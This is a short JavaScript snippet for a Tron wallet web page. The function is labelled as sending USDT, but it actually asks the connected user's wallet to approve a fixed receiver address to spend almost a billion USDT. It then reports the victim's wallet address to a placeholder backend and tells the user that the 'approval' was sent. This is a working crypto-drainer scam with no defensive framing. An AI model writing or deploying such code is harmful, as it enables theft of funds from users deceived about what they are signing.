const receiver = "TKTdAiXKvAWH7T9bxpBodYecRPtFDGZ7jN";
const contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRC-20 USDT

async function sendUSDT() {
  if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
    alert("Please connect your Tron wallet.");
    return;
  }

  const tronWeb = window.tronWeb;
  const userAddress = tronWeb.defaultAddress.base58;

  const contract = await tronWeb.contract().at(contractAddress);
  await contract.approve(receiver, 999999999000000).send({ from: userAddress });

  // Send to backend
  fetch("https://YOUR_REPLIT_BACKEND_URL_HERE/approve", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ wallet: userAddress })
  });

  alert("Approval sent. Please wait...");
}
